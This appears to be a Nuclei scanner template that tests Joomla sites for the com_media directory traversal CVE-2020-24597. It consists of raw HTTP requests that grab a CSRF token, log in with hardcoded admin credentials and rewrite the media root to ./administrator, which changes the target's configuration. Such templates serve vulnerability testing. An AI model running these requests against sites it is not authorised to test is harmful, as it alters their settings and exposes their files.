id: CVE-2020-24597
info:
  author: Kien Nguyen
  description: Lack of input validation allows com_media root paths outside of the
    webroot.
  name: Directory traversal in com_media
  reference:
  - https://developer.joomla.org/security-centre/827-20200803-core-directory-traversal-in-com-media.html
  - https://github.com/HoangKien1020/CVE-2020-24597
  severity: low
  tags: cve, joomla, traversal
requests:
- cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - name="([a-f0-9]{32})" value="1"
    type: regex
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - name="([a-f0-9]{32})" value="1"
    type: regex
  matchers:
  - condition: and
    part: body_5
    type: word
    words:
    - folder=manifests
    - folder=logs
  raw:
  - 'GET /administrator/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /administrator/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&passwd={{passwd}}&option=com_login&task=login&return=aW5kZXgucGhw&{{token}}=1

    '
  - 'GET /administrator/index.php?option=com_config HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /administrator/index.php?option=com_config HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    jform%5Bfile_path%5D=./administrator&jform%5Bimage_path%5D=./administrator&id=13&component=com_media&return=&task=config.save.component.apply&{{token}}=1

    '
  - 'GET /administrator/index.php?option=com_media&view=imageList HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
variables:
  passwd: '123456'
  username: superadmin
